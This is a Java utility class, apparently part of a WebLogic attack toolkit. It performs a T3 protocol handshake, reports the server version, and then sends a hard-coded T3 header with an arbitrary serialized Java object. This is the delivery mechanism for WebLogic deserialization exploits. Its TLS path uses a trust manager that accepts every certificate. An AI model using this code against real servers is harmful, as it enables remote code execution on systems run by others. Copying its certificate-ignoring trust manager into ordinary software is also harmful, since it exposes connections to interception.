package utils.weblogic;


import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.*;
import java.net.Socket;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;

public class T3ProtocolOperation {

    public static String bytesToHexString(byte[] src) {
        StringBuilder stringBuilder = new StringBuilder("");
        if (src == null || src.length <= 0) {
            return null;
        }
        for (int i = 0; i < src.length; i++) {
            int v = src[i] & 0xFF;
            String hv = Integer.toHexString(v);
            if (hv.length() < 2) {
                stringBuilder.append(0);
            }
            stringBuilder.append(hv);
        }
        return stringBuilder.toString();
    }

    public static byte[] hexStringToBytes(String hexString) {
        if (hexString != null && !hexString.equals("")) {
            hexString = hexString.toUpperCase();
            int length = hexString.length() / 2;
            char[] hexChars = hexString.toCharArray();
            byte[] d = new byte[length];

            for (int i = 0; i < length; ++i) {
                int pos = i * 2;
                d[i] = (byte) (charToByte(hexChars[pos]) << 4 | charToByte(hexChars[pos + 1]));
            }

            return d;
        } else {
            return null;
        }
    }

    private static byte charToByte(char c) {
        return (byte) "0123456789ABCDEF".indexOf(c);
    }

    public static byte[] serialize(Object ref) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(ref);
        return out.toByteArray();
    }

    public static void send(String protocol, String host, String port, byte[] payload) throws Exception {
        Socket socket = null;
        if (protocol.equalsIgnoreCase("t3s")){
            SSLContext context = SSLContext.getInstance("SSL");
            context.init(null, new TrustManager[] {(TrustManager) new TrustManagerImpl()}, new SecureRandom());
            SSLSocketFactory factory = context.getSocketFactory();
            socket = factory.createSocket(host, Integer.parseInt(port));
        }
        else{socket = new Socket(host, Integer.parseInt(port));}
      //AS ABBREV_TABLE_SIZE HL remoteHeaderLength 用来做skip的
        String header = "t3 7.0.0.0\nAS:10\nHL:19\n\n";
        socket.getOutputStream().write(header.getBytes());
        socket.getOutputStream().flush();
        BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        String versionInfo = br.readLine();
        versionInfo = versionInfo.replace("HELO:", "");
        versionInfo = versionInfo.replace(".false", "");
        System.out.println("WeblogicVersion: " + versionInfo);

        String data1 = "016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000";
        String data2 = bytesToHexString(payload);
        String data = data1 + data2;
        data = String.format("%08x", (data.length() / 2 + 4)) + data;
        socket.getOutputStream().write(hexStringToBytes(data));
        socket.getOutputStream().write(hexStringToBytes(data));

    }
    static class TrustManagerImpl implements X509TrustManager {
        public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {}

        public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {}

        public X509Certificate[] getAcceptedIssuers() {
            return null;
        }
    }

}
